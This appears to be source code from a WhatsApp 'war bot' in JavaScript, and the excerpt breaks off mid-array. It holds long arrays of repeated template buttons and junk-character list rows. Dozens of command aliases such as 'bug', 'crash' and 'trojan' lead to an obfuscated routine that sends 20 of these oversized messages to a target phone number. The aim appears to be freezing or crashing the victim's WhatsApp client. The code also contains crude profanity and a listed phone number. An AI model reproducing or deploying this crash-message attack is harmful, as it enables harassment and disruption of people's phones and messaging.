{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quoted: lep }
]})
}}
break
case 'aduhcoy':
if (!itsMediablo) return
touchmebre = [
{
title: `🌷 TANZA WAR BOT 🌷 ${buttonvirus} ${buttonvirus}`,
rows: [
{title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
{title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
]
}
]
diablo.sendListMsg(m.chat, `🌷 TANZA WAR BOT 🌷`, diablo.user.name, `Hay Kak Sc Bot Adia Di List`, `Click Here 🌷`, touchmebre, m)
break

case '🌷':
   case '🗿':
      case '🔥':
         case 'banned':
case 'santet':
case 'bug':
case 'troli':
case 'bom':
case 'mental':
case 'crash':
case 'ganas':
case 'button':
case 'trava':
case 'katalog':
case 'bugmex':
case 'bugsuhu':
case 'bugjago':
case 'bugdarkness':
case 'bugwaifu':
case 'bugbully':
case 'bugslebew':
case 'bugneko':
case 'bughentai':
case 'trojan':
case '😈':
case '💀':
case '💥':
case '🤡':
case 'tanzakiller':
case 'jasonkiller':
case 'thanoskiller':
case 'tanzasendbug1':
case 'tanzasendbug2':
case 'tanzasendbug3':
case 'tanzasendbug4':
case 'tanzasendbug5':
case 'tanzasendbug6':
case 'tanzasendbug7':
case 'tanzasendbug8':
case 'tanzasendbug9':
case 'tanzasendbug10':
case 'tanzagokil':
case 'cabul':
case 'perkosa':
case 'cucuk':
case 'unlimitedkarma':
case 'tanza1000':
case 'lastbug':
case 'gass':
case 'kamunanya':
case '😘':
case '😎':
case '🦏':
case '🦁':
case '🐯':
case 'tanzagas1':
case 'tanzagas2':
case 'tanzagas4':
case 'tanzagas5':
case 'tanzabug1':
case 'tanzabug2':
case 'tanzabug3':
case 'tanzabug4':
case 'tanzabug5':
case 'tanzaboykot':
case 'tanzakenon':
case 'tanzagokil':
case 'tanzaentod':
case 'tanzajebol':
case 'tanzakiller':
case 'tanzamega':
case 'tanzacounter':
case 'gasbro':
case 'amanbro?':
case 'crasher':
case 'megabug':
case '🔊':
case '💩':
case '🏮':
case '🇲🇾':
case '🇮🇩':
case '🇵🇹':
case '🇧🇷':
case '🇦🇷':
case '🇦🇶':
case '🇦🇴':
case '🇦🇲':
case '🇦🇱':
case '🇦🇮':
case '🇦🇬':
case '🇦🇫':
case '🇦🇪':
case '🇦🇩':
case '🇦🇨':
case 'fuckyou':
case 'lempartaik':
case 'alokhamil':
case 'tampar':
case 'tabok':
case 'haha':
case 'toxic':
case '😤':
case '🗣️':
case '☣️':
case '⚠️':
case '☢️':
case 'sg2':
case 'sg6':
case 'ak47':
case 'granat':
case 'landmine':
case 'awm':
case 'plasma':
case 'deserteagle':
case 'pepengshot':
case 'm182b':
case 'panci':
case 'mp40':
case 'mp5':
case 'ultilancelot':
case 'ultichou':
case 'hookfranco':
case 'ultiyin':
case 'hanzomalingbuff':
case 'ultibeatrix':
case 'ultilayla':
case 'ultialpha':
case 'aldous500stack':
case 'ultianakharam':
case 'ultioddete':
case 'johnsonxoddet':
case 'ultialucrot':
case 'desahanangela':
case 'ultibadangxskill2':
case 'stuneudora':
case 'tanzzbug1':
case 'tanzzbug2':
case 'tanzzbug3':
case 'tanzzbug4':
case 'tanzzbug5':
case 'tanzzbug6':
case 'tanzzbug7':
case 'tanzzbug8':
case 'tanzzbug9':
case 'tanzzbug10':
case 'tanzzgg1':
case 'tanzzgg2':
case 'tanzzgg3':
case 'tanzzgg4':
case 'tanzzgg5':
case 'tanzzgg6':
case 'tanzzgg7':
case 'tanzzgg8':
case 'tanzzgg9':
case 'tanzzgg10':
case 'bugnaga':
case 'dragonbug':
case 'ampunbg':
case '🐲':
case '🐢':
case '🐊':
case '🐸':
case '🍀':
case '🌿':
case '☘️':
case '🌾':
case '🌵':
case '🌴':
case '🌳':
case '🌲':
case '🌱':
case 'ibramgas1':
case 'ibramgas2':
case 'ibramgas3':
case 'ibramgas4':
case 'ibramgas5':
case 'ibramgas6':
case 'ibramgas7':
case 'ibramgas8':
case 'ibramgas9':
case 'ibramgas10':
case 'ibramboykot':
case 'ibramkenon':
case 'ibramgokil':
case 'ibramentod':
case 'ibramjebol':
case 'ibramkiller':
case 'ibramcounter':
case 'ibrammega':
case 'ibrambug1':
case 'ibrambug2':
case 'ibrambug3':
case 'ibrambug4':
case 'ibrambug5':
case 'ibrambug6':
case 'ibrambug7':
case 'ibrambug8':
case 'ibrambug9':
case 'ibrambug10':
case 'ibramsendbug1':
case 'ibramsendbug3':
case 'ibramsendbug2':
case 'ibramkiller':
case 'ibramgokil':  const _0x9b73d7=_0x268f;function _0x16ca(){const _0x174fe6=['☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','1301419blsWFD','6932mTzwKV','BUG\x20BY\x20AZAAALYNNE','8410380bCGJGY','157322kyamfD','211CGbyZQ','2418PETmGu','290NjpjKy','128910NzpElc','sendMessage','62368OiCTSf','https://www.whatsapp.com/otp/copy/','6NwCzzo','Bug Send By +60162276340\x20✅','reply','170JTeEvp','99XnyyEA'];_0x16ca=function(){return _0x174fe6;};return _0x16ca();}function _0x268f(_0x1886bf,_0x4cbe97){const _0x16ca4e=_0x16ca();return _0x268f=function(_0x268f42,_0xaf1515){_0x268f42=_0x268f42-0xff;let _0x4604b8=_0x16ca4e[_0x268f42];return _0x4604b8;},_0x268f(_0x1886bf,_0x4cbe97);}(function(_0x129aa0,_0x4ae1d3){const _0x517830=_0x268f,_0x2b387=_0x129aa0();while(!![]){try{const _0x32af14=parseInt(_0x517830(0x10e))/0x1*(parseInt(_0x517830(0x10f))/0x2)+parseInt(_0x517830(0xff))/0x3+-parseInt(_0x517830(0x10a))/0x4*(parseInt(_0x517830(0x106))/0x5)+-parseInt(_0x517830(0x103))/0x6*(-parseInt(_0x517830(0x109))/0x7)+parseInt(_0x517830(0x101))/0x8*(parseInt(_0x517830(0x107))/0x9)+-parseInt(_0x517830(0x110))/0xa*(-parseInt(_0x517830(0x10d))/0xb)+-parseInt(_0x517830(0x10c))/0xc;if(_0x32af14===_0x4ae1d3)break;else _0x2b387['push'](_0x2b387['shift']());}catch(_0x370954){_0x2b387['push'](_0x2b387['shift']());}}}(_0x16ca,0x36dc9));{if(!isGroup)return diablobotwhatsapp[_0x9b73d7(0x105)]('INFO YA\x20LU\x20JAN\x20SOK ASIK\x20KONTOL\x20JIJIK GW');txts=_0x9b73d7(0x104),diablobotwhatsapp['reply'](txts);if(!q)return;num=''+q+'@s.whatsapp.net',jumlah='20',waktu='5s';for(let i=0x0;i<jumlah;i++){diablo[_0x9b73d7(0x100)](num,{'text':_0x9b73d7(0x10b),'templateButtons':[{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20AZAAALYNNE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'